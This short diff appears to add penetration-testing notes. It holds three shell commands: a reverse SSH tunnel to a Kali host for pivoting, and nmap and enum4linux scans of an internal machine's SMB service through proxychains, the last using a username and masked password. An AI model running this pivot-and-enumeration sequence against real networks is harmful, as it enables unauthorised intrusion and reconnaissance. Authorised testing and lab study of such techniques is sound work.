@@ -1,0 +1,4 @@
+ssh -R 9050:localhost:22 kali@192.168.2.53
+proxychains nmap -Pn -sT -v 192.168.3.3 -p 445
+proxychains enum4linux -S -u aita -p **** 192.168.3.3
+
